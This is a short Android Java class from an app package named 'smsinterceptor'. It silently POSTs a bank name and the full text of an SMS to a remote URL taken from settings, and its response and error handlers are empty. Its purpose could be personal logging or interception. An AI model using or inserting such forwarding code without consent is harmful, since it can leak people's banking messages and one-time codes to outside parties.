package bz.militaryholding.smsinterceptor.tools;

import android.content.Context;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class MessageSender {
    private static MessageSender sender;
    private Context context;

    private RequestQueue queue;

    private MessageSender(Context context) {
        this.context = context;
    }

    public static MessageSender getInstance(Context context) {
        if(sender == null) {
            sender = new MessageSender(context);
        }
        return sender;
    }

    public void sendSmsText(final String bank, final String smsText) {
        String url = Prefs.getInstance(context).getScriptUrl();
        if(!url.isEmpty()) {
            queue = Volley.newRequestQueue(context);
            StringRequest request = new StringRequest(Request.Method.POST, url,
                    new Response.Listener<String>() {

                        @Override
                        public void onResponse(String response) {

                        }
                    },
                    new Response.ErrorListener() {

                        @Override
                        public void onErrorResponse(VolleyError error) {

                        }
                    })
            {
                @Override
                protected Map<String,String> getParams(){
                    Map<String,String> params = new HashMap<String, String>();
                    params.put("bank", bank);
                    params.put("smsText", smsText);

                    return params;
                }
        };
        queue.add(request);
        }
    }
}